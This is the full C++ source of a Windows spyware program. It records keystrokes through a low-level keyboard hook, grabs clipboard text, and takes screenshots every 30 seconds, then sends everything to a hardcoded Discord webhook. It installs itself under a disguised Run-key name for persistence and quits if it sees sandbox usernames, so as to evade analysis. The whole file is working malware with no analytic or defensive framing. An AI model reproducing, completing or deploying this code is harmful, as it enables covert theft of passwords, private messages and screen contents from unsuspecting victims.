#define _CRT_SECURE_NO_WARNINGS
#define KEYLOG_BUFFER_SIZE 2048
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <gdiplus.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

char keylog_buffer[KEYLOG_BUFFER_SIZE];
int keylog_index = 0;
CRITICAL_SECTION keylog_lock;

#define WEBHOOK_URL "/api/webhooks/1385120469564526725/yyzcf-UNbnrGoqeOe1Zi9nvUw0Uqfi7Z7EbI6f35WTn0KWVCMn8kSw7__AiCvfy8Z0u-"
#define MUTEX_NAME "Global\\mutex_alosh"

HHOOK keyboardHook;
HANDLE mutexHandle;
ULONG_PTR gdiplusToken;

// =============== DPI AWARENESS FOR MINGW ===============
typedef BOOL(WINAPI* SetDPIAwareFunc)();
void enableDPIAwareness() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        SetDPIAwareFunc setDPIAware = (SetDPIAwareFunc)GetProcAddress(hUser32, "SetProcessDPIAware");
        if (setDPIAware) setDPIAware();
        FreeLibrary(hUser32);
    }
}

// =============== UTIL ===============
std::string getTargetDir() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        strcat_s(path, "\\supergroup\\");
        CreateDirectoryA(path, NULL);
        return std::string(path);
    }
    return "";
}
void addRegistryPersistence(const std::string& exePath) {
    HKEY hKey;
    const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "Fanservice";  // Stealthy name

    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath.c_str(), (DWORD)(exePath.length() + 1));
        RegCloseKey(hKey);
    }
}

// =============== PERSISTENCE ===============
void installSelf() {
    char exePath[MAX_PATH], targetPath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
    sprintf_s(targetPath, "%slogger.exe", getTargetDir().c_str());
    CopyFileA(exePath, targetPath, FALSE);

    // 📌 Add registry persistence
    addRegistryPersistence(std::string(targetPath));
}

// =============== DISCORD TEXT ===============
void send_to_discord_text(const char* msg) {
    HINTERNET hInt = InternetOpenA("discord", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInt) return;
    HINTERNET hConn = InternetConnectA(hInt, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInt); return; }

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", WEBHOOK_URL, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInt); return; }

    char data[2048];
    sprintf_s(data, "content=%s", msg);
    const char* headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    HttpSendRequestA(hReq, headers, -1, data, strlen(data));

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);
}

// =============== DISCORD FILE ===============
void send_to_discord_file(const char* filename, BYTE* data, DWORD size) {
    const char* boundary = "------------------------snake";
    BYTE* payload = new BYTE[size + 4096];
    DWORD pos = 0;

    char head[1024];
    sprintf_s(head,
        "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, filename);
    memcpy(payload + pos, head, strlen(head)); pos += strlen(head);
    memcpy(payload + pos, data, size); pos += size;
    char tail[128];
    sprintf_s(tail, "\r\n--%s--\r\n", boundary);
    memcpy(payload + pos, tail, strlen(tail)); pos += strlen(tail);

    HINTERNET hInt = InternetOpenA("discord-upload", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInt) { delete[] payload; return; }
    HINTERNET hConn = InternetConnectA(hInt, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", WEBHOOK_URL, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

    char hdrs[256];
    sprintf_s(hdrs, "Content-Type: multipart/form-data; boundary=%s", boundary);
    HttpSendRequestA(hReq, hdrs, strlen(hdrs), payload, pos);

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);
    delete[] payload;
}

// =============== SCREENSHOT (DPI SAFE) ===============
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

DWORD WINAPI screenshot_thread(LPVOID) {
    while (1) {
        int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        char dbg[128];
        sprintf_s(dbg, "📸 Full Screen: x=%d y=%d w=%d h=%d", x, y, w, h);
        send_to_discord_text(dbg);

        HDC hdc = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(memDC, hBitmap);
        BitBlt(memDC, 0, 0, w, h, hdc, x, y, SRCCOPY);

        Bitmap bmp(hBitmap, NULL);
        CLSID pngClsid;
        if (GetEncoderClsid(L"image/png", &pngClsid) != -1) {
            IStream* stream;
            if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK) {
                if (bmp.Save(stream, &pngClsid, NULL) == Ok) {
                    HGLOBAL hGlobal;
                    if (GetHGlobalFromStream(stream, &hGlobal) == S_OK) {
                        DWORD size = GlobalSize(hGlobal);
                        BYTE* data = (BYTE*)GlobalLock(hGlobal);
                        if (data) {
                            send_to_discord_file("screen.png", data, size);
                            GlobalUnlock(hGlobal);
                        }
                    }
                }
                stream->Release();
            }
        }

        DeleteObject(hBitmap);
        DeleteDC(memDC);
        ReleaseDC(NULL, hdc);
        Sleep(30000);
    }
    return 0;
}

// =============== CLIPBOARD ===============
DWORD WINAPI clipboard_thread(LPVOID) {
    std::string last;
    while (1) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* clip = (char*)GlobalLock(hData);
                if (clip && last != clip) {
                    send_to_discord_text(clip);
                    last = clip;
                }
                GlobalUnlock(hData);
            }
            CloseClipboard();
        }
        Sleep(5000);
    }
    return 0;
}

// =============== KEYLOGGER ===============
// NEW: send keylog buffer to Discord as text
void send_to_text(const char* msg) {
    if (msg && msg[0]) {
        send_to_discord_text(msg);
    }
}

void flush_keylog_buffer() {
    EnterCriticalSection(&keylog_lock);
    if (keylog_index > 0 && keylog_index < KEYLOG_BUFFER_SIZE) {
        keylog_buffer[keylog_index] = '\0';
        send_to_text(keylog_buffer);
        keylog_index = 0;
        keylog_buffer[0] = '\0';
    }
    LeaveCriticalSection(&keylog_lock);
}

DWORD WINAPI keylog_flush_thread(LPVOID) {
    while (1) {
        Sleep(30000);
        flush_keylog_buffer();
    }
    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;
        char key[32];
        if (vk >= 'A' && vk <= 'Z') {
            sprintf_s(key, "%c", (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? vk : vk + 32);
        } else if (vk >= '0' && vk <= '9') {
            sprintf_s(key, "%c", vk);
        } else {
            sprintf_s(key, "[%lu]", vk);
        }

        EnterCriticalSection(&keylog_lock);
        int len = strlen(key);
        if (keylog_index + len < KEYLOG_BUFFER_SIZE - 1) {
            memcpy(keylog_buffer + keylog_index, key, len);
            keylog_index += len;
            keylog_buffer[keylog_index] = '\0';
        } else {
            flush_keylog_buffer();
            if (len < KEYLOG_BUFFER_SIZE - 1) {
                memcpy(keylog_buffer, key, len);
                keylog_index = len;
                keylog_buffer[len] = '\0';
            }
        }
        LeaveCriticalSection(&keylog_lock);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// =============== BOOTSTRAP ===============
BOOL ensure_single_instance() {
    mutexHandle = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    return (GetLastError() != ERROR_ALREADY_EXISTS);
}

BOOL isSandboxed() {
    char* u = getenv("USERNAME");
    return u && (!strcmp(u, "sandbox") || !strcmp(u, "maltest"));
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    enableDPIAwareness();  // ✅ Works on MinGW

    if (!ensure_single_instance() || isSandboxed()) return 0;

    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    InitializeCriticalSection(&keylog_lock);

    installSelf();

    CreateThread(NULL, 0, clipboard_thread, NULL, 0, NULL);
    CreateThread(NULL, 0, screenshot_thread, NULL, 0, NULL);
    CreateThread(NULL, 0, keylog_flush_thread, NULL, 0, NULL);

    keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleA(NULL), 0);
    if (!keyboardHook) return 0;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    GdiplusShutdown(gdiplusToken);
    DeleteCriticalSection(&keylog_lock);
    return 0;
}
